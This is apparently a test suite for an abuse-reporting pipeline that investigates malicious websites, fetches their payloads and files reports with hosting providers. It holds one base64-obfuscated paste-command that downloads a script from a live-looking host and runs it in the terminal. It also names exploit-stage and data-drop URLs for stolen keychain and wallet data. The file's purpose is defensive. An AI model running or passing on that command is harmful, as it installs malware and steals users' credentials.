import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { eq } from "drizzle-orm";

import { SubmissionsEntity } from "../../db/entities";
import { getDb } from "../../db";
import { useTemporaryDatabase } from "../../db/test_helpers";
import { reportConfirmedWebsiteAbuse } from "../submission_reports";
import { ExfiltrationProbeExhaustedError, runExfiltrationProbe, type ExfiltrationProbeResult } from "../../exfiltration/probe";
import { runReportInvestigation, type InvestigationDependencies } from "../../investigation/run";
import { extractPasteCommands } from "../../malware/paste_commands";
import { readInvestigationJobPayload } from "../../investigation/payload";
import { abuseArtifacts, abuseJobs } from "../schema";
import { AbuseRepository } from "../repository";
import { AbuseWorker } from "../worker";
import { IPHONE_USER_AGENT } from "../../browser/page";
import { CORUNA_LOADER } from "../../malware/coruna_loader.fixture";
import type { WebsiteHiddenFrame } from "../../website_types";

useTemporaryDatabase();

const originalSecret = process.env.ABUSE_TRACKING_TOKEN_SECRET;
beforeAll(() => { process.env.ABUSE_TRACKING_TOKEN_SECRET = "investigation-test-secret-at-least-32-bytes"; });
afterAll(() => {
	if (originalSecret === undefined) delete process.env.ABUSE_TRACKING_TOKEN_SECRET;
	else process.env.ABUSE_TRACKING_TOKEN_SECRET = originalSecret;
});

// Production case 375628583143477248 (paneo.work).
const PANEO_COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const PAYLOAD_URL = "https://keychainagent.pro/wksxgj/wZZLR9xY29o4";
const PAYLOAD = Buffer.from("var platformDispatcher = this[(function(){ /* obfuscated JXA loader */ })()];");
// A decodable 1×1 PNG: the page report's screenshot evidence.
const SCREENSHOT = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");

async function confirmedCase(id: bigint, finding: Parameters<typeof reportConfirmedWebsiteAbuse>[0]["finding"], url = "https://paneo.work/") {
	await SubmissionsEntity.create({ id, kind: "website", data: { kind: "website", website: { url } }, dedupeKey: `investigation:${id.toString()}` });
	const report = await reportConfirmedWebsiteAbuse({
		submissionId: id,
		urls: [url],
		analysisText: finding.finding === "malware" ? "The page distributes malware." : "The page collects account credentials.",
		reporter: {},
		finding,
		pasteCommands: finding.finding === "malware" ? extractPasteCommands(PANEO_COMMAND) : [],
		screenshots: [{ filename: "website.png", png: SCREENSHOT }],
	});
	const job = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.reportId, report.reportId)).get()!;
	return { report, job };
}

const adapter = {} as never;
const noProbe: ExfiltrationProbeResult = { requests: 3, backends: [], downloads: [], egress: "phishing" };

function jobsOf(reportId: bigint) {
	return getDb().then((db) => db.select().from(abuseJobs).where(eq(abuseJobs.reportId, reportId)).all());
}

/** Investigation dependencies that never touch the network; uploads are recorded. */
function offline(overrides: Partial<InvestigationDependencies> = {}) {
	const fetched: Array<{ url: string; userAgent: string }> = [];
	const deps: Partial<InvestigationDependencies> = {
		fetchPayload: async (url, userAgent) => {
			fetched.push({ url, userAgent });
			return { url, finalUrl: url, body: PAYLOAD, contentType: "application/octet-stream", fileName: "wZZLR9xY29o4.js" };
		},
		pipelineConfig: () => ({ storeRoot: undefined, malwareBazaarAuthKey: undefined, virusTotalApiKey: "vt-key", uploadPermitted: new Set(["virustotal" as const]), retentionMs: 86_400_000 }),
		investigateSample: async (sample) => ({
			sha256: "e23507e03916279372baa4f0c314fb3df5d78d741eeb7df25f43fe33ae50d9c5",
			action: { action: "upload", providers: ["virustotal"] },
			uploads: [{ provider: "virustotal", state: "submitted", analysisId: `analysis-${sample.bytes.byteLength}` }],
		}),
		awaitVerdict: async () => ({ provider: "virustotal", state: "known", verdict: "malicious" }),
		probe: async () => noProbe,
		now: () => new Date("2026-11-02T20:00:00.000Z"),
		...overrides,
	};
	return { deps, fetched };
}

function workerWith(deps: Partial<InvestigationDependencies>, owner: string) {
	return new AbuseWorker({ owner, adapter, investigateReport: (params, getAdapter) => runReportInvestigation(params, getAdapter, deps) });
}

describe("pre-report investigation", () => {
	test("a malware page's payload is fetched, judged, reported at its host, and only then is the page's report resolved", async () => {
		const submissionId = 501n;
		const { report, job } = await confirmedCase(submissionId, { finding: "malware" });
		expect(job).toMatchObject({ jobType: "investigate_report" });
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("investigating");
		expect((await jobsOf(report.reportId)).map((item) => item.jobType)).toEqual(["investigate_report"]);

		const { deps, fetched } = offline();
		expect(await workerWith(deps, "investigation-malware").processOne(false, { jobTypes: ["investigate_report"] })).toBeTrue();

		// The command is fetched with the downloader the command itself uses.
		// The command pipes curl into osascript: the host answers curl's User-Agent.
		expect(fetched).toEqual([{ url: PAYLOAD_URL, userAgent: "curl/8.7.1" }]);

		const released = await AbuseRepository.getReport(report.reportId);
		expect(released?.status).toBe("accepted");
		expect(released?.allegationCategory).toBe("malware");
		expect(released?.description).toContain("We downloaded the payload from https://keychainagent.pro/wksxgj/wZZLR9xY29o4 as the command does");
		expect(released?.description).not.toContain("| zsh");
		expect(released?.description).toContain("SHA-256 e23507e03916279372baa4f0c314fb3df5d78d741eeb7df25f43fe33ae50d9c5");
		expect(released?.description).toContain("VirusTotal classifies this file as malicious: https://www.virustotal.com/gui/file/e23507e03916279372baa4f0c314fb3df5d78d741eeb7df25f43fe33ae50d9c5");
		expect((await jobsOf(report.reportId)).map((item) => item.jobType).sort()).toEqual(["investigate_report", "resolve_report"]);
		const evidence = (await getDb()).select().from(abuseArtifacts).where(eq(abuseArtifacts.reportId, report.reportId)).all();
		expect(evidence.map((artifact) => artifact.name)).toContain("payload-e23507e039162793.json");

		// The payload host has its own malware report on the same case.
		const reports = await AbuseRepository.listReportsForSubmission(submissionId);
		const hostReport = reports.find((item) => item.id !== report.reportId)!;
		// Cloudflare's reviewer must send the downloader's User-Agent: the host answers a browser with 404.
		expect(hostReport).toMatchObject({ allegationCategory: "malware", status: "accepted", reportedUserAgent: "curl/8.7.1" });
		expect(hostReport.description).toContain(`tells visitors to paste a command into their terminal, and that command downloads and runs code from ${PAYLOAD_URL}`);
		expect(hostReport.description).toContain(`request the URL with the User-Agent "curl/8.7.1", for example: curl -A "curl/8.7.1"`);
		expect(hostReport.description).toContain("Command shown on the page (defanged): ");
		expect(hostReport.description).toContain("[pipe] base64 -d [pipe] zsh");
		expect(hostReport.description).not.toContain("| zsh");
		// The lure page's screenshot travels with the host report; image-only forms (Eranet) require it.
		const hostEvidence = (await AbuseRepository.getReportInput(hostReport.id))!.evidenceArtifacts;
		expect(hostEvidence.map((artifact) => [artifact.name, artifact.mimeType])).toEqual([
			["malware-payload-evidence.json", "application/json"],
			["lure-page.png", "image/png"],
		]);
		expect((await AbuseRepository.listTargets(hostReport.id)).map((target) => [target.normalizedTarget, target.observedUrls])).toEqual([["keychainagent.pro", [PAYLOAD_URL]]]);

		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: {
			status: "completed",
			backendCount: 0,
			payloads: [{ url: PAYLOAD_URL, sha256: "e23507e03916279372baa4f0c314fb3df5d78d741eeb7df25f43fe33ae50d9c5", sizeBytes: PAYLOAD.byteLength, verdict: "virustotal: malicious" }],
		} } });
	});

	test("a retry after a crash between the host report and the release neither duplicates nor double-releases", async () => {
		const submissionId = 502n;
		const { report } = await confirmedCase(submissionId, { finding: "malware" });
		const params = { reportId: report.reportId, payload: readInvestigationJobPayload((await jobsOf(report.reportId))[0]!.payload), reporter: {} };
		// The first attempt reports the payload host, then the browser service fails before the release.
		const crashing = offline({ probe: async () => { throw new Error("Expected 101 status code"); } });
		await expect(runReportInvestigation(params, () => adapter, crashing.deps)).rejects.toThrow("Expected 101");
		expect(await AbuseRepository.listReportsForSubmission(submissionId)).toHaveLength(2);
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("investigating");

		// The retry downloads again later, from the host's next rotated path, and finds the same host report.
		const retry = offline({
			now: () => new Date("2026-11-02T20:05:00.000Z"),
			fetchPayload: async (url) => ({ url, finalUrl: `${url}-rotated`, body: PAYLOAD }),
		});
		await runReportInvestigation(params, () => adapter, retry.deps);
		expect(await AbuseRepository.listReportsForSubmission(submissionId)).toHaveLength(2);
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("accepted");

		// A replay of an already released report does nothing at all.
		await runReportInvestigation(params, () => adapter, retry.deps);
		expect(await AbuseRepository.listReportsForSubmission(submissionId)).toHaveLength(2);
		expect((await jobsOf(report.reportId)).filter((item) => item.jobType === "resolve_report")).toHaveLength(1);
	});

	test("a payload host that refuses the download is recorded, and the page is still reported", async () => {
		const submissionId = 503n;
		const { report } = await confirmedCase(submissionId, { finding: "malware" });
		const { deps } = offline({ fetchPayload: async () => { throw new Error("The payload host answered HTTP 404."); } });
		await workerWith(deps, "investigation-refused").processOne(false, { jobTypes: ["investigate_report"] });
		const released = await AbuseRepository.getReport(report.reportId);
		expect(released?.status).toBe("accepted");
		expect(released?.description).toContain("refused the download during our check (The payload host answered HTTP 404.)");
		expect(await AbuseRepository.listReportsForSubmission(submissionId)).toHaveLength(1);
		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: { status: "completed", payloads: [{ url: PAYLOAD_URL, error: "The payload host answered HTTP 404." }] } } });
	});

	test("an exhausted form probe is recorded and the report is sent with what was collected", async () => {
		const submissionId = 504n;
		const { report, job } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		let attempts = 0;
		const { deps } = offline({ probe: async () => { attempts++; throw new ExfiltrationProbeExhaustedError([{ egress: "phishing", reason: "blocked" }]); } });
		expect(await workerWith(deps, "investigation-exhausted").processOne(false, { jobTypes: ["investigate_report"] })).toBeTrue();
		expect(attempts).toBe(1);
		expect((await getDb()).select().from(abuseJobs).where(eq(abuseJobs.id, job.id)).get()).toMatchObject({ status: "completed", retryCount: 0 });
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("accepted");
		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: { status: "completed", probeError: expect.stringContaining("exhausted every route") } } });
	});

	test("a probe's data drops and downloads become report evidence", async () => {
		const submissionId = 505n;
		const { report } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		const { deps } = offline({
			probe: async () => ({
				requests: 4,
				backends: [{ kind: "domain", key: "domain:collector.example.net", endpointUrl: "https://collector.example.net/x", hostname: "collector.example.net", method: "POST", matchedCanaries: ["email"], request: { timestamp: "t", method: "POST", url: "https://collector.example.net/x" } }],
				downloads: [{ url: "https://cdn.example.net", outcome: { sha256: "b".repeat(64), action: { action: "record_known_verdict", verdict: "malicious", provider: "malwarebazaar" }, uploads: [] } }],
				egress: "phishing",
			}),
		});
		await workerWith(deps, "investigation-probe").processOne(false, { jobTypes: ["investigate_report"] });
		const description = (await AbuseRepository.getReport(report.reportId))?.description;
		expect(description).toContain("the page sent what was typed to: collector.example.net");
		expect(description).toContain(`delivered a file with SHA-256 ${"b".repeat(64)}, which malwarebazaar classifies as malicious`);
	});

	test("a browser-service failure retries the whole investigation and keeps the report held", async () => {
		const submissionId = 506n;
		const { report, job } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		const { deps } = offline({ probe: async () => { throw new Error("Expected 101 status code"); } });
		await workerWith(deps, "investigation-infra").processOne(false, { jobTypes: ["investigate_report"] });
		expect((await getDb()).select().from(abuseJobs).where(eq(abuseJobs.id, job.id)).get()).toMatchObject({ status: "queued", retryCount: 1 });
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("investigating");
		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: { status: "queued", lastError: "Expected 101 status code" } } });
	});

	test("retry exhaustion releases the report without evidence instead of holding it forever", async () => {
		const submissionId = 507n;
		const { report, job } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		(await getDb()).update(abuseJobs).set({ retryCount: 8 }).where(eq(abuseJobs.id, job.id)).run();
		const { deps } = offline({ probe: async () => { throw new Error("browser unavailable"); } });
		await workerWith(deps, "investigation-exhausted-retries").processOne(false, { jobTypes: ["investigate_report"] });
		expect((await getDb()).select().from(abuseJobs).where(eq(abuseJobs.id, job.id)).get()).toMatchObject({ status: "failed", lastError: "browser unavailable" });
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("accepted");
		expect((await jobsOf(report.reportId)).map((item) => item.jobType).sort()).toEqual(["investigate_report", "resolve_report"]);
		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: { status: "failed", lastError: "browser unavailable" } } });
	});

	test("site verdicts on every route from a real Skyvern walk end the probe after one walk", async () => {
		const submissionId = 508n;
		const { report, job } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		const runsByEgress: string[] = [];
		const siteVerdicts: Record<string, { status: string; failure_reason: string }> = {
			phishing: { status: "failed", failure_reason: "Max steps exceeded" },
			reporting: { status: "failed", failure_reason: "Cloudflare challenge did not clear" },
			residential: { status: "failed", failure_reason: "Could not verify you are human" },
		};
		const fakeAdapter = {
			createTask: async (_payload: unknown, options?: { browserAddress: string }) => {
				const egress = options?.browserAddress.replace("ws://relay/", "") ?? "unknown";
				runsByEgress.push(egress);
				return { runId: `run-${egress}`, response: {} };
			},
			getRun: async (runId: string) => siteVerdicts[runId.replace("run-", "")]!,
			cancelRun: async () => undefined,
		};
		const { deps } = offline({
			probe: (input, signal) => runExfiltrationProbe(input, fakeAdapter, signal, {
				createCanaries: () => ({ marker: "psprobe_0123456789abcdef", email: "probe.0123456789abcdef@probe-canary.invalid", password: "A9!psprobe_0123456789abcdef!qZ", phone: "+15550100123", cardNumber: "4242424242424242", oneTimeCode: "123456" }),
				acquireBinding: async (egress) => ({ sessionId: `browser-session_${egress}`, browserAddress: `ws://relay/${egress}`, release: async () => undefined, cancel: async () => undefined }),
				connectBrowser: async () => ({ disconnect: () => undefined } as never),
				createRecorder: () => ({ start: async () => undefined, stop: async () => [] }),
				heartbeat: async () => undefined,
				sleep: async () => undefined,
			}),
		});
		await workerWith(deps, "investigation-real-verdicts").processOne(false, { jobTypes: ["investigate_report"] });
		expect(runsByEgress).toEqual(["phishing", "reporting", "residential"]);
		expect((await getDb()).select().from(abuseJobs).where(eq(abuseJobs.id, job.id)).get()).toMatchObject({ status: "completed", retryCount: 0 });
		expect((await AbuseRepository.getReport(report.reportId))?.status).toBe("accepted");
	});

	test("an investigation that outlives the external lane deadline is not cut off", async () => {
		const submissionId = 509n;
		const { job } = await confirmedCase(submissionId, { finding: "phishing", phishingBasis: "credential_theft" }, "https://phish.example.com/");
		let finished = false;
		const { deps } = offline({ probe: async () => { await new Promise((resolve) => setTimeout(resolve, 1_600)); finished = true; return noProbe; } });
		const worker = new AbuseWorker({ owner: "investigation-long", adapter, externalJobTimeoutMs: 1_000, investigateReport: (params, getAdapter) => runReportInvestigation(params, getAdapter, deps) });
		await worker.processOne(false, { jobTypes: ["investigate_report"] });
		expect(finished).toBeTrue();
		expect((await getDb()).select().from(abuseJobs).where(eq(abuseJobs.id, job.id)).get()?.status).toBe("completed");
	}, 20_000);
});

describe("drive-by exploit investigation", () => {
	// ktrced.top frames the loader of 92haoyun.icu (production case 377486973465530391).
	const PAGE = "https://ktrced.top/";
	const FRAME = "https://ktrced.top/gooll/gooll.html";
	const REMOTE_STAGE = "https://92haoyun.icu/pe/0cb19f768eb8cd92.js";
	const LOCAL_STAGE = "https://ktrced.top/pe_main.js";
	const LOOT = "https://92haoyun.icu/coruna-loot";
	const LOCAL_DROP = "https://ktrced.top/logs";

	function hiddenFrame(): WebsiteHiddenFrame {
		return {
			ref: "frame1",
			url: FRAME,
			hiddenBy: "0×0 size",
			sha256: "f".repeat(64),
			size: CORUNA_LOADER.length,
			source: CORUNA_LOADER,
			resources: [],
			sentRequests: [{ url: LOOT, method: "POST", body: '{"cmd":"bridge_status"}' }],
			signals: {
				platformGate: ["iPhone OS", "CPU OS"],
				runsFetchedCode: true,
				stageUrls: [REMOTE_STAGE, LOCAL_STAGE],
				dataUploads: [
					{ url: LOOT, data: ["keychain", "wallet"], observed: true },
					{ url: LOCAL_DROP, data: ["passwords"], observed: false },
				],
			},
			userAgent: IPHONE_USER_AGENT,
		};
	}

	test("the loader's stages are fetched as the iPhone it attacks, another host's stage and data drop get linked reports, and no form probe runs", async () => {
		const submissionId = 520n;
		await SubmissionsEntity.create({ id: submissionId, kind: "website", data: { kind: "website", website: { url: PAGE } }, dedupeKey: `investigation:${submissionId.toString()}` });
		const report = await reportConfirmedWebsiteAbuse({
			submissionId,
			urls: [PAGE],
			analysisText: "The page attacks its visitors' devices without any action from them.",
			reporter: {},
			finding: { finding: "malware" },
			screenshots: [{ filename: "website.png", png: SCREENSHOT }],
			hiddenFrame: hiddenFrame(),
		});
		const payload = readInvestigationJobPayload((await jobsOf(report.reportId))[0]!.payload);
		expect(payload.exploitLoader).toEqual({ frameUrl: FRAME, userAgent: IPHONE_USER_AGENT, stageUrls: [REMOTE_STAGE, LOCAL_STAGE], dataUploads: hiddenFrame().signals.dataUploads });
		// The page's own report carries the frame's source for the provider to check.
		const pageEvidence = (await AbuseRepository.getReportInput(report.reportId))!.evidenceArtifacts;
		expect(pageEvidence.map((artifact) => [artifact.name, artifact.mimeType])).toEqual([["website.png", "image/png"], [`hidden-frame-${"f".repeat(16)}.json`, "application/json"]]);
		const frameEvidence = JSON.parse(Buffer.from(pageEvidence[1]!.blob).toString("utf8"));
		expect(frameEvidence).toMatchObject({ url: FRAME, hiddenBy: "0×0 size", source: CORUNA_LOADER, userAgent: IPHONE_USER_AGENT });
		expect(frameEvidence.ref).toBeUndefined();

		const { deps, fetched } = offline({ probe: async () => { throw new Error("A drive-by case has no form to probe."); } });
		expect(await workerWith(deps, "investigation-drive-by").processOne(false, { jobTypes: ["investigate_report"] })).toBeTrue();

		expect(fetched).toEqual([{ url: REMOTE_STAGE, userAgent: IPHONE_USER_AGENT }, { url: LOCAL_STAGE, userAgent: IPHONE_USER_AGENT }]);
		const released = await AbuseRepository.getReport(report.reportId);
		expect(released?.status).toBe("accepted");
		expect(released?.description).toContain("We downloaded the exploit loader's file https://92haoyun.icu/pe/0cb19f768eb8cd92.js as the browser it attacks would");
		expect(released?.description).toContain("We downloaded the exploit loader's file https://ktrced.top/pe_main.js as the browser it attacks would");

		// Only another host gets its own report: the page's own stage and drop are the page's report.
		const linked = (await AbuseRepository.listReportsForSubmission(submissionId)).filter((item) => item.id !== report.reportId);
		const targets = await Promise.all(linked.map(async (item) => ({ item, targets: await AbuseRepository.listTargets(item.id) })));
		const stageReport = targets.find(({ item }) => item.description.startsWith("This host serves malware"))!;
		expect(stageReport.item).toMatchObject({ allegationCategory: "malware", reportedUserAgent: IPHONE_USER_AGENT });
		expect(stageReport.item.description).toContain(`runs an exploit loader in a frame no visitor can see (https://ktrced.top/gooll/gooll.html), and that loader downloads this file from ${REMOTE_STAGE}`);
		expect(stageReport.targets.map((target) => [target.normalizedTarget, target.observedUrls])).toEqual([["92haoyun.icu", [REMOTE_STAGE]]]);
		const dropReport = targets.find(({ item }) => item.description.startsWith("This host receives data stolen"))!;
		expect(dropReport.item.allegationCategory).toBe("malware");
		expect(dropReport.item.description).toContain(`sends keychain, wallet data from the device to ${LOOT}`);
		expect(dropReport.item.description).toContain("Our capture saw the loader send a request to this endpoint.");
		expect(dropReport.targets.map((target) => [target.normalizedTarget, target.observedUrls])).toEqual([["92haoyun.icu", [LOOT]]]);
		const dropEvidence = (await AbuseRepository.getReportInput(dropReport.item.id))!.evidenceArtifacts;
		expect(dropEvidence.map((artifact) => artifact.name)).toEqual(["malware-data-drop-evidence.json", "lure-page.png"]);
		expect(linked).toHaveLength(2);

		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: { status: "completed", backendCount: 0 } } });
		expect(((await SubmissionsEntity.get(submissionId))?.data as { website: { investigation: { probeError?: string } } }).website.investigation.probeError).toBeUndefined();
	});

	test("a job stored with a malformed exploit loader is a programming error, not a site verdict", () => {
		const base = { submissionId: "1", pageUrl: PAGE, finding: { finding: "malware" }, pasteCommands: [] };
		expect(() => readInvestigationJobPayload({ ...base, exploitLoader: { frameUrl: FRAME, stageUrls: [] } })).toThrow("malformed payload.exploitLoader");
		expect(readInvestigationJobPayload(base).exploitLoader).toBeUndefined();
		// An upload without its data or observation is dropped, not trusted.
		expect(readInvestigationJobPayload({ ...base, exploitLoader: { frameUrl: FRAME, userAgent: IPHONE_USER_AGENT, stageUrls: [REMOTE_STAGE], dataUploads: [{ url: LOOT }, { url: LOOT, data: ["keychain"], observed: false }] } }).exploitLoader)
			.toEqual({ frameUrl: FRAME, userAgent: IPHONE_USER_AGENT, stageUrls: [REMOTE_STAGE], dataUploads: [{ url: LOOT, data: ["keychain"], observed: false }] });
	});
});
